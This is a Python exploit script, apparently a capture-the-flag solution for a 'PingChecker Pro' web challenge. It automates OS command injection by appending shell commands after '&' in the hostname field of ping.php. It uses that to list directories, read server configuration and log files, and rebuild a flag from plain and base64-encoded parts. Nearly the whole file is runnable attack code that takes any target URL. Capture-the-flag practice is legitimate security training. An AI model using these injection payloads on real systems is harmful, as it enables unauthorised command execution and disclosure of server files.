#!/usr/bin/env python3
"""
PingChecker Pro - CTF Exploit
WPCTF 2025 - Web Easy Challenge
"""

import requests
import sys
import base64
import re
from urllib.parse import urlparse

def print_banner():
    """Print exploit banner"""
    print("""
╔═══════════════════════════════════════════════╗
║       PingChecker Pro - Exploit Script        ║
║              WPCTF 2025 Edition               ║
╚═══════════════════════════════════════════════╝
    """)

def normalize_url(url):
    """Normalize the target URL"""
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url
    
    parsed = urlparse(url)
    if not parsed.path or parsed.path == '/':
        base_url = f"{parsed.scheme}://{parsed.netloc}"
    else:
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path.rstrip('/')}"
    
    return base_url

def test_injection(session, url):
    """Test if command injection works"""
    print("[*] Testing command injection vulnerability...")
    
    payload = "127.0.0.1 & echo 'INJECTION_TEST'"
    response = session.post(f"{url}/ping.php", data={"hostname": payload})
    
    if "INJECTION_TEST" in response.text:
        print("[+] Command injection confirmed!")
        return True
    else:
        print("[-] Command injection not working")
        return False

def discover_paths(session, url):
    """Discover file paths through enumeration"""
    print("\n[*] Discovering file paths...")
    
    # Check HTML comments for hints
    response = session.post(f"{url}/ping.php", data={"hostname": "127.0.0.1"})
    
    if "/var/backups/" in response.text:
        print("[+] Found hint in HTML comments: /var/backups/")
    
    # Enumerate /var/backups
    print("[*] Enumerating /var/backups/...")
    response = session.post(f"{url}/ping.php", data={"hostname": "127.0.0.1 & ls -la /var/backups"})
    
    if "system.conf" in response.text:
        print("[+] Found system.conf in /var/backups/")
        return True
    
    return False

def extract_flag_part1(session, url):
    """Extract first part of the flag"""
    print("\n[*] Reading /var/backups/system.conf...")
    
    response = session.post(f"{url}/ping.php", 
                           data={"hostname": "127.0.0.1 & grep . /var/backups/system.conf"})
    
    flag_part1 = ""
    log_path = None
    data_file = None
    
    # Parse the configuration file
    for line in response.text.split('\n'):
        # Look for flag part
        if "SERVICE_TOKEN=" in line and "WPCTF{" in line:
            match = re.search(r'SERVICE_TOKEN=(WPCTF\{[^}]*)', line)
            if match:
                flag_part1 = match.group(1)
                print(f"[+] Found flag part 1: {flag_part1}")
        
        # Look for log path
        if "LOG_PATH=" in line:
            match = re.search(r'LOG_PATH=([^\s<]+)', line)
            if match:
                log_path = match.group(1)
        
        # Look for data file
        if "DATA_FILE=" in line:
            match = re.search(r'DATA_FILE=([^\s<]+)', line)
            if match:
                data_file = match.group(1)
    
    # Construct second location
    if log_path and data_file:
        second_location = log_path + data_file
        print(f"[+] Discovered second location from config: {second_location}")
    
    return flag_part1

def extract_flag_part2(session, url):
    """Extract and decode second part of the flag"""
    print("\n[*] Reading /opt/logs/data.log...")
    
    response = session.post(f"{url}/ping.php", 
                           data={"hostname": "127.0.0.1 & grep . /opt/logs/data.log"})
    
    flag_part2 = ""
    
    # Split response into lines and look for base64
    lines = response.text.split('\n')
    
    print("[*] Searching for base64 encoded data...")
    
    for i, line in enumerate(lines):
        # Skip lines with obvious log entries or HTML
        if '[INFO]' in line or 'PING' in line or '<' in line:
            continue
        
        # Look for base64 pattern (clean line with base64 chars only)
        line = line.strip()
        if re.match(r'^[A-Za-z0-9+/]{20,}={0,2}$', line):
            try:
                decoded = base64.b64decode(line).decode('utf-8', errors='ignore').strip()
                
                # Check if this looks like the flag ending
                if decoded and ('}' in decoded or 
                              all(c in 'abcdefghijklmnopqrstuvwxyz0123456789_' for c in decoded.replace('}', ''))):
                    flag_part2 = decoded
                    print(f"[+] Found and decoded part 2: {flag_part2}")
                    break
            except:
                continue
    
    if not flag_part2:
        # Fallback: look for specific base64 pattern
        base64_pattern = r'[A-Za-z0-9+/]{30,}={0,2}'
        matches = re.findall(base64_pattern, response.text)
        
        for match in matches:
            if any(skip in match for skip in ['http', 'www', 'html', 'body']):
                continue
            
            try:
                decoded = base64.b64decode(match).decode('utf-8', errors='ignore').strip()
                if decoded and '}' in decoded:
                    flag_part2 = decoded
                    print(f"[+] Found and decoded part 2: {flag_part2}")
                    break
            except:
                continue
    
    return flag_part2

def main():
    """Main exploit function"""
    print_banner()
    
    if len(sys.argv) < 2:
        print("Usage: python3 exploit.py <target_url>")
        print("Example: python3 exploit.py http://localhost:8080")
        sys.exit(1)
    
    target_url = normalize_url(sys.argv[1])
    print(f"[*] Target: {target_url}")
    
    # Create session
    session = requests.Session()
    session.headers.update({'User-Agent': 'PingChecker-Exploit/1.0'})
    
    # Test injection
    if not test_injection(session, target_url):
        print("[-] Target does not appear to be vulnerable")
        sys.exit(1)
    
    # Discover paths
    if not discover_paths(session, target_url):
        print("[-] Could not discover required paths")
        sys.exit(1)
    
    # Extract flag parts
    flag_part1 = extract_flag_part1(session, target_url)
    flag_part2 = extract_flag_part2(session, target_url)
    
    # Combine flag
    print("\n" + "="*50)
    if flag_part1 and flag_part2:
        complete_flag = flag_part1 + flag_part2
        print(f"[+] COMPLETE FLAG: {complete_flag}")
    else:
        print("[-] Could not extract complete flag")
        if flag_part1:
            print(f"    Part 1: {flag_part1}")
        if flag_part2:
            print(f"    Part 2: {flag_part2}")
        print("\n[!] Try manual extraction using the following commands:")
        print("    127.0.0.1 & grep . /var/backups/system.conf")
        print("    127.0.0.1 & grep . /opt/logs/data.log")
        print("    Then decode the base64 string manually")
    
    print("="*50)

if __name__ == "__main__":
    main()
